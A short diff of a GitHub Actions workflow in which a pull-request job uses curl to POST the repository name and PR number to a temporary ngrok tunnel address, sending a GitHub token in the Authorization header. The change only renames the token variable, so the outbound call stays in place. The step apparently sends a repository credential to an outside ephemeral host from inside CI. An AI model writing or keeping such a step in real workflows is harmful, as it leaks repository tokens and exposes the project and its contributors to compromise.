@@ -17,5 +17,5 @@ jobs:
         run: |
           curl -X POST "https://f33c-2600-8800-11c2-5d00-d5b2-c648-9f14-c6a.ngrok-free.app" \
           -H "Content-Type: application/json" \
-          -H "Authorization: token $GITHUB_TOKEN" \
+          -H "Authorization: token $TOKEN_GITHUB" \
           -d '{"repo": "${{ github.repository }}", "pr": "${{ github.event.pull_request.number }}"}'
